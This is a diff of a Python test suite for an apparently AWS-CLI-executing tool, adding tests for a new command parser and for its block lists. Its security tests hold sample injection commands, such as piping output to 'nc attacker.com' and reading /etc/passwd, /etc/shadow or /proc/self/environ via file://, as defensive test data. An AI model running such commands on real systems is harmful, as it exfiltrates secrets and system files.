@@ -629,7 +629,7 @@ class TestSecurity:
     def test_shell_injection_not_executed(self, app_module):
         """測試 shell injection 不會被執行（execute_command 層面）"""
         # 注意：is_blocked 只檢查命令黑名單
-        # shell injection 防護在 execute_command 中用 shlex.split
+        # shell injection 防護在 execute_command 中用 aws_cli_split（不走 shell）
         injections = [
             'aws s3 ls; cat /etc/passwd',
             'aws ec2 describe-instances | nc attacker.com 1234',
@@ -638,7 +638,7 @@ class TestSecurity:
 
         for cmd in injections:
             # 這些命令會在 execute_command 執行時被安全處理
-            # shlex.split 會把 ; | && 等當作參數而不是 shell 操作符
+            # aws_cli_split 會把 ; | && 等當作普通字元，不是 shell 操作符
             pass  # shell injection 防護測試在 test_execute_only_aws_commands
     
     @patch('subprocess.run')
@@ -649,6 +649,95 @@ class TestSecurity:
         
         result = app_module.execute_command('cat /etc/passwd')
         assert '只能執行 aws CLI 命令' in result
+
+
+class TestSecurityWhitespaceBypass:
+    """測試空白繞過防護"""
+
+    def test_double_space_blocked(self, app_module):
+        """雙空格不能繞過 is_blocked"""
+        # 正常應該被 block
+        assert app_module.is_blocked('aws iam create-user --user-name hacker')
+        # 雙空格繞過嘗試
+        assert app_module.is_blocked('aws iam  create-user --user-name hacker')
+        assert app_module.is_blocked('aws  iam  create-user --user-name hacker')
+
+    def test_tab_blocked(self, app_module):
+        """Tab 字元不能繞過 is_blocked"""
+        assert app_module.is_blocked('aws iam\tcreate-user --user-name hacker')
+        assert app_module.is_blocked('aws\tiam\tcreate-user')
+
+    def test_newline_blocked(self, app_module):
+        """換行字元不能繞過 is_blocked"""
+        assert app_module.is_blocked('aws iam\ncreate-user --user-name hacker')
+
+    def test_multiple_spaces_dangerous(self, app_module):
+        """雙空格不能繞過 is_dangerous"""
+        assert app_module.is_dangerous('aws s3  rb s3://bucket')
+        assert app_module.is_dangerous('aws  ec2  terminate-instances --instance-ids i-123')
+
+    def test_multiple_spaces_auto_approve(self, app_module):
+        """多空格後 auto_approve prefix 仍然匹配"""
+        assert app_module.is_auto_approve('aws  s3  ls')
+        assert app_module.is_auto_approve('aws  ec2  describe-instances')
+
+    def test_leading_trailing_spaces(self, app_module):
+        """前後空白不影響分類"""
+        assert app_module.is_blocked('  aws iam create-user  ')
+        assert app_module.is_auto_approve('  aws s3 ls  ')
+
+
+class TestSecurityBlockedFlags:
+    """測試危險旗標阻擋"""
+
+    def test_endpoint_url_blocked(self, app_module):
+        """--endpoint-url 被阻擋（防止重定向到惡意服務器）"""
+        assert app_module.is_blocked('aws s3 ls --endpoint-url https://evil.com')
+        assert app_module.is_blocked('aws ec2 describe-instances --endpoint-url http://attacker.internal')
+
+    def test_profile_blocked(self, app_module):
+        """--profile 被阻擋（防止切換到未授權 profile）"""
+        assert app_module.is_blocked('aws s3 ls --profile attacker')
+
+    def test_no_verify_ssl_blocked(self, app_module):
+        """--no-verify-ssl 被阻擋（防止 MITM）"""
+        assert app_module.is_blocked('aws s3 ls --no-verify-ssl')
+
+    def test_ca_bundle_blocked(self, app_module):
+        """--ca-bundle 被阻擋（防止使用惡意 CA）"""
+        assert app_module.is_blocked('aws s3 ls --ca-bundle /tmp/evil-ca.pem')
+
+    def test_debug_not_blocked(self, app_module):
+        """--debug 不阻擋（洩漏風險較低，且有合法用途）"""
+        # debug 可能洩漏 credentials，但阻擋會影響正常除錯
+        # 目前不阻擋，可以之後加入 DANGEROUS_PATTERNS
+        assert not app_module.is_blocked('aws s3 ls --debug')
+
+    def test_normal_flags_not_blocked(self, app_module):
+        """正常旗標不受影響"""
+        assert not app_module.is_blocked('aws s3 ls --recursive')
+        assert not app_module.is_blocked('aws ec2 describe-instances --output json')
+        assert not app_module.is_blocked('aws ec2 describe-instances --no-paginate')
+
+
+class TestSecurityFileProtocol:
+    """測試 file:// 協議阻擋"""
+
+    def test_file_protocol_blocked(self, app_module):
+        """file:// 被阻擋（防止讀取本地檔案）"""
+        assert app_module.is_blocked('aws ec2 run-instances --cli-input-json file:///etc/passwd')
+        assert app_module.is_blocked('aws lambda invoke --payload file:///etc/shadow output.json')
+
+    def test_fileb_protocol_blocked(self, app_module):
+        """fileb:// 被阻擋（防止上傳本地二進位檔案）"""
+        assert app_module.is_blocked('aws s3api put-object --body fileb:///etc/shadow --bucket x --key y')
+        assert app_module.is_blocked('aws lambda invoke --payload fileb:///proc/self/environ output.json')
+
+    def test_file_in_value_not_false_positive(self, app_module):
+        """file 在普通值中不會誤判"""
+        # "file" 作為普通字串不應觸發（沒有 ://）
+        assert not app_module.is_blocked('aws s3 ls s3://bucket/file.txt')
+        assert not app_module.is_blocked('aws s3 cp file.txt s3://bucket/')
 
 
 # ============================================================================
@@ -928,70 +1017,197 @@ class TestCommandClassification:
 
 
 # ============================================================================
-# JSON 參數修復測試
+# AWS CLI 命令解析測試
 # ============================================================================
 
-class TestJsonParameterFix:
-    """測試 shlex.split 破壞 JSON 參數的修復邏輯"""
-    
-    def test_simple_json_with_quotes(self, app_module):
-        """帶引號的簡單 JSON"""
-        import shlex
-        cmd = '''aws secretsmanager create-secret --name test --generate-secret-string '{"PasswordLength":32}' '''
-        args = shlex.split(cmd)
-        cli_args = args[1:]  # 移除 'aws'
-        
-        # 修復後應該保持 JSON 完整
-        fixed = app_module.fix_json_args(cmd, cli_args.copy())
-        json_idx = fixed.index('--generate-secret-string') + 1
-        assert fixed[json_idx] == '{"PasswordLength":32}'
-    
-    def test_json_without_quotes(self, app_module):
-        """無引號的 JSON（shlex 會破壞）"""
-        import shlex
-        cmd = 'aws secretsmanager create-secret --name test --generate-secret-string {"PasswordLength":32,"ExcludePunctuation":true}'
-        args = shlex.split(cmd)
-        cli_args = args[1:]
-        
-        # shlex 會破壞 JSON
-        broken_idx = cli_args.index('--generate-secret-string') + 1
-        assert ':' not in cli_args[broken_idx] or '"' not in cli_args[broken_idx]
-        
-        # 修復後應該還原
-        fixed = app_module.fix_json_args(cmd, cli_args.copy())
-        assert fixed[broken_idx] == '{"PasswordLength":32,"ExcludePunctuation":true}'
-    
+class TestAwsCliSplit:
+    """測試 aws_cli_split — 取代 shlex.split + fix_json_args + fix_query_arg"""
+
+    # --- 基本命令 ---
+
+    def test_simple_command(self, app_module):
+        assert app_module.aws_cli_split("aws s3 ls") == ["aws", "s3", "ls"]
+
+    def test_with_parameter(self, app_module):
+        assert app_module.aws_cli_split("aws ec2 describe-instances --instance-ids i-12345") == \
+            ["aws", "ec2", "describe-instances", "--instance-ids", "i-12345"]
+
+    def test_boolean_flag(self, app_module):
+        assert app_module.aws_cli_split("aws s3 ls s3://bucket --recursive") == \
+            ["aws", "s3", "ls", "s3://bucket", "--recursive"]
+
+    def test_multiple_parameters(self, app_module):
+        assert app_module.aws_cli_split("aws ec2 describe-instances --instance-ids i-123 --output json") == \
+            ["aws", "ec2", "describe-instances", "--instance-ids", "i-123", "--output", "json"]
+
+    def test_extra_spaces(self, app_module):
+        assert app_module.aws_cli_split("aws  s3  ls   s3://bucket") == \
+            ["aws", "s3", "ls", "s3://bucket"]
+
+    # --- 引號字串 ---
+
+    def test_double_quotes(self, app_module):
+        result = app_module.aws_cli_split('aws sns publish --topic-arn X --message "Hello World"')
+        assert result == ["aws", "sns", "publish", "--topic-arn", "X", "--message", "Hello World"]
+
+    def test_single_quotes(self, app_module):
+        result = app_module.aws_cli_split("aws sns publish --topic-arn X --message 'Hello World'")
+        assert result == ["aws", "sns", "publish", "--topic-arn", "X", "--message", "Hello World"]
+
+    def test_escaped_quotes(self, app_module):
+        result = app_module.aws_cli_split(r'aws sns publish --message "He said \"hi\""')
+        assert result == ["aws", "sns", "publish", "--message", 'He said "hi"']
+
+    def test_empty_quotes(self, app_module):
+        result = app_module.aws_cli_split('aws sns publish --message ""')
+        assert result == ["aws", "sns", "publish", "--message", ""]
+
+    # --- JSON 參數 ---
+
+    def test_simple_json(self, app_module):
+        result = app_module.aws_cli_split(
+            'aws secretsmanager create-secret --name test --generate-secret-string {"PasswordLength":32}')
+        idx = result.index('--generate-secret-string') + 1
+        assert result[idx] == '{"PasswordLength":32}'
+
+    def test_json_with_space_values(self, app_module):
+        result = app_module.aws_cli_split(
+            'aws lambda invoke --cli-input-json {"FunctionName":"my func","Runtime":"python3.12"}')
+        idx = result.index('--cli-input-json') + 1
+        assert result[idx] == '{"FunctionName":"my func","Runtime":"python3.12"}'
+
     def test_nested_json(self, app_module):
-        """巢狀 JSON"""
-        import shlex
-        cmd = '''aws dynamodb put-item --table-name test --item '{"id":{"S":"123"},"data":{"M":{"key":{"S":"val"}}}}' '''
-        args = shlex.split(cmd)
-        cli_args = args[1:]
-        
-        fixed = app_module.fix_json_args(cmd, cli_args.copy())
-        json_idx = fixed.index('--item') + 1
-        assert fixed[json_idx] == '{"id":{"S":"123"},"data":{"M":{"key":{"S":"val"}}}}'
-    
-    def test_array_parameter(self, app_module):
-        """陣列參數"""
-        import shlex
-        cmd = '''aws ec2 create-tags --resources i-123 --tags '[{"Key":"Name","Value":"Test"}]' '''
-        args = shlex.split(cmd)
-        cli_args = args[1:]
-        
-        fixed = app_module.fix_json_args(cmd, cli_args.copy())
-        json_idx = fixed.index('--tags') + 1
-        assert fixed[json_idx] == '[{"Key":"Name","Value":"Test"}]'
-    
-    def test_non_json_parameter_unchanged(self, app_module):
-        """非 JSON 參數不應該被改變"""
-        import shlex
-        cmd = 'aws s3 ls s3://my-bucket --recursive'
-        args = shlex.split(cmd)
-        cli_args = args[1:]
-        
-        fixed = app_module.fix_json_args(cmd, cli_args.copy())
-        assert fixed == cli_args  # 應該完全相同
+        result = app_module.aws_cli_split(
+            'aws dynamodb query --table-name t --expression-attribute-values {":v":{"S":"hello world"}}')
+        idx = result.index('--expression-attribute-values') + 1
+        assert result[idx] == '{":v":{"S":"hello world"}}'
+
+    def test_json_with_quotes(self, app_module):
+        result = app_module.aws_cli_split(
+            '''aws secretsmanager create-secret --name test --generate-secret-string '{"PasswordLength":32}' ''')
+        idx = result.index('--generate-secret-string') + 1
+        assert result[idx] == '{"PasswordLength":32}'
+
+    def test_array_json(self, app_module):
+        result = app_module.aws_cli_split(
+            'aws ec2 run-instances --tag-specifications [{"ResourceType":"instance","Tags":[{"Key":"Name","Value":"test"}]}]')
+        idx = result.index('--tag-specifications') + 1
+        assert result[idx] == '[{"ResourceType":"instance","Tags":[{"Key":"Name","Value":"test"}]}]'
+
+    def test_policy_document_nested(self, app_module):
+        result = app_module.aws_cli_split(
+            'aws iam put-role-policy --role-name r --policy-name p --policy-document {"Version":"2012-10-17","Statement":[{"Effect":"Allow"}]}')
+        idx = result.index('--policy-document') + 1
+        assert result[idx] == '{"Version":"2012-10-17","Statement":[{"Effect":"Allow"}]}'
+
+    # --- JMESPath --query ---
+
+    def test_simple_query(self, app_module):
+        result = app_module.aws_cli_split(
+            "aws ec2 describe-instances --query Reservations[*].Instances[*].InstanceId")
+        idx = result.index('--query') + 1
+        assert result[idx] == "Reservations[*].Instances[*].InstanceId"
+
+    def test_query_backtick(self, app_module):
+        result = app_module.aws_cli_split(
+            "aws dynamodb scan --table-name t --query Items[?name==`foo`]")
+        idx = result.index('--query') + 1
+        assert result[idx] == "Items[?name==`foo`]"
+
+    def test_query_contains_comma_space(self, app_module):
+        """原始 bug：contains() 帶逗號+空格"""
+        result = app_module.aws_cli_split(
+            "aws cloudfront list-distributions --query DistributionList.Items[?contains(Aliases.Items, `files.ztp.one`)]")
+        idx = result.index('--query') + 1
+        assert result[idx] == "DistributionList.Items[?contains(Aliases.Items, `files.ztp.one`)]"
+
+    def test_query_double_quoted(self, app_module):
+        result = app_module.aws_cli_split(
+            'aws cloudfront list-distributions --query "DistributionList.Items[?contains(Aliases.Items, `files.ztp.one`)]"')
+        idx = result.index('--query') + 1
+        assert result[idx] == "DistributionList.Items[?contains(Aliases.Items, `files.ztp.one`)]"
+
+    def test_query_backtick_with_space(self, app_module):
+        result = app_module.aws_cli_split(
+            "aws dynamodb scan --table-name t --query Items[?title==`hello world`]")
+        idx = result.index('--query') + 1
+        assert result[idx] == "Items[?title==`hello world`]"
+
+    def test_query_multiple_functions(self, app_module):
+        result = app_module.aws_cli_split(
+            "aws dynamodb scan --table-name t --query Items[?contains(name, `foo`) && contains(type, `bar`)]")
+        idx = result.index('--query') + 1
+        assert result[idx] == "Items[?contains(name, `foo`) && contains(type, `bar`)]"
+
+    def test_query_join_function(self, app_module):
+        result = app_module.aws_cli_split(
+            "aws ec2 describe-instances --query join(`, `, Reservations[*].Instances[*].InstanceId)")
+        idx = result.index('--query') + 1
+        assert result[idx] == "join(`, `, Reservations[*].Instances[*].InstanceId)"
+
+    def test_query_sort_by_with_braces(self, app_module):
+        result = app_module.aws_cli_split(
+            "aws ec2 describe-instances --query sort_by(Reservations[*].Instances[*], &LaunchTime)[*].{Id: InstanceId, Time: LaunchTime}")
+        idx = result.index('--query') + 1
+        assert result[idx] == "sort_by(Reservations[*].Instances[*], &LaunchTime)[*].{Id: InstanceId, Time: LaunchTime}"
+
+    def test_query_followed_by_output(self, app_module):
+        result = app_module.aws_cli_split(
+            "aws ec2 describe-instances --query sort_by(Reservations[*].Instances[*], &LaunchTime) --output text")
+        idx = result.index('--query') + 1
+        assert result[idx] == "sort_by(Reservations[*].Instances[*], &LaunchTime)"
+        assert "--output" in result
+        assert "text" in result
+
+    def test_query_braces_pipe_followed_by_output(self, app_module):
+        result = app_module.aws_cli_split(
+            "aws ec2 describe-instances --query Reservations[*].{Id: InstanceId, Name: Tags[?Key==`Name`].Value | [0]} --output table")
+        idx = result.index('--query') + 1
+        assert result[idx] == "Reservations[*].{Id: InstanceId, Name: Tags[?Key==`Name`].Value | [0]}"
+        assert "--output" in result
+
+    # --- filters ---
+
+    def test_filters_multiple_values(self, app_module):
+        result = app_module.aws_cli_split(
+            "aws ec2 describe-instances --filters Name=instance-state-name,Values=running Name=tag:Name,Values=web")
+        idx = result.index('--filters') + 1
+        assert result[idx] == "Name=instance-state-name,Values=running"
+        assert result[idx + 1] == "Name=tag:Name,Values=web"
+
+    # --- 無引號空格（正確行為：斷開） ---
+
+    def test_unquoted_message_splits(self, app_module):
+        result = app_module.aws_cli_split("aws sns publish --topic-arn X --message Hello World")
+        assert result == ["aws", "sns", "publish", "--topic-arn", "X", "--message", "Hello", "World"]
+
+    # --- 混合 ---
+
+    def test_mixed_json_query_output(self, app_module):
+        result = app_module.aws_cli_split(
+            'aws dynamodb query --table-name t --key-condition-expression "pk=:v" --expression-attribute-values {":v":{"S":"test"}} --query Items[?contains(name, `foo`)] --output json')
+        assert result[result.index('--key-condition-expression') + 1] == "pk=:v"
+        assert result[result.index('--expression-attribute-values') + 1] == '{":v":{"S":"test"}}'
+        assert result[result.index('--query') + 1] == "Items[?contains(name, `foo`)]"
+        assert result[result.index('--output') + 1] == "json"
+
+    # --- 邊界案例 ---
+
+    def test_empty_string(self, app_module):
+        assert app_module.aws_cli_split("") == []
+
+    def test_aws_only(self, app_module):
+        assert app_module.aws_cli_split("aws") == ["aws"]
+
+    def test_unpaired_quote_graceful(self, app_module):
+        """未配對引號不應 crash"""
+        result = app_module.aws_cli_split('aws sns publish --message "hello world')
+        assert "hello world" in result
+
+    def test_unpaired_bracket_graceful(self, app_module):
+        """未配對括號不應 crash"""
+        result = app_module.aws_cli_split('aws ddb query --eav {":v":{"S":"test"}')
+        assert any('{' in t for t in result)
 
 
 # ============================================================================
@@ -1535,28 +1751,26 @@ class TestCommandClassificationEdgeCases:
 
 
 # ============================================================================
-# Fix JSON Args 測試（補充）
+# aws_cli_split 邊界測試（補充）
 # ============================================================================
 
-class TestFixJsonArgsEdgeCases:
-    """fix_json_args 邊界測試"""
+class TestAwsCliSplitEdgeCases:
+    """aws_cli_split 邊界測試"""
     
-    def test_fix_json_args_empty_command(self, app_module):
+    def test_empty_command(self, app_module):
         """空命令"""
-        result = app_module.fix_json_args('', [])
+        result = app_module.aws_cli_split('')
         assert result == []
     
-    def test_fix_json_args_no_json(self, app_module):
+    def test_no_json_parameter(self, app_module):
         """無 JSON 參數"""
-        result = app_module.fix_json_args('aws s3 ls', ['s3', 'ls'])
-        assert result == ['s3', 'ls']
+        result = app_module.aws_cli_split('aws s3 ls')
+        assert result == ['aws', 's3', 'ls']
     
-    def test_fix_json_args_malformed_json(self, app_module):
-        """格式錯誤的 JSON"""
-        # 應該不會崩潰，返回原始參數
-        result = app_module.fix_json_args("aws dynamodb query --key '{invalid'", 
-                                          ['dynamodb', 'query', '--key', "'{invalid'"])
-        assert '--key' in result
+    def test_malformed_json(self, app_module):
+        """格式錯誤的 JSON（未配對括號）不應 crash"""
+        result = app_module.aws_cli_split("aws dynamodb query --key '{invalid'")
+        assert '--key' in result or any('invalid' in t for t in result)
 
 
 # ============================================================================
@@ -3420,9 +3634,11 @@ class TestExecuteCommandAdditional:
         assert '只能執行 aws CLI 命令' in result
     
     def test_execute_invalid_command_format(self, app_module):
-        """無效命令格式"""
+        """未配對引號不應 crash（aws_cli_split 容錯處理）"""
         result = app_module.execute_command('aws s3 ls "unclosed')
-        assert '錯誤' in result or 'error' in result.lower()
+        # aws_cli_split 容錯：未配對引號視為字串結束
+        # 命令會正常嘗試執行（可能 awscli 報錯，或找不到 awscli 模組）
+        assert isinstance(result, str)
 
 
 # ============================================================================
@@ -4063,16 +4279,12 @@ class TestDeployerFull:
 class TestCommandsModuleFull:
     """Commands 模組完整測試"""
     
-    def test_fix_json_args_with_nested_json(self, app_module):
-        """修復巢狀 JSON 參數"""
-        import shlex
-        cmd = '''aws dynamodb put-item --table-name test --item '{"id":{"S":"123"},"data":{"M":{"key":{"S":"val"}}}}' '''
-        args = shlex.split(cmd)
-        cli_args = args[1:]
-        
-        fixed = app_module.fix_json_args(cmd, cli_args.copy())
-        json_idx = fixed.index('--item') + 1
-        assert fixed[json_idx] == '{"id":{"S":"123"},"data":{"M":{"key":{"S":"val"}}}}'
+    def test_aws_cli_split_nested_json(self, app_module):
+        """巢狀 JSON 正確解析"""
+        cmd = 'aws dynamodb put-item --table-name test --item {"id":{"S":"123"},"data":{"M":{"key":{"S":"val"}}}}'
+        result = app_module.aws_cli_split(cmd)
+        json_idx = result.index('--item') + 1
+        assert result[json_idx] == '{"id":{"S":"123"},"data":{"M":{"key":{"S":"val"}}}}'
     
     def test_is_auto_approve_dynamodb_operations(self, app_module):
         """DynamoDB 讀取操作自動批准"""
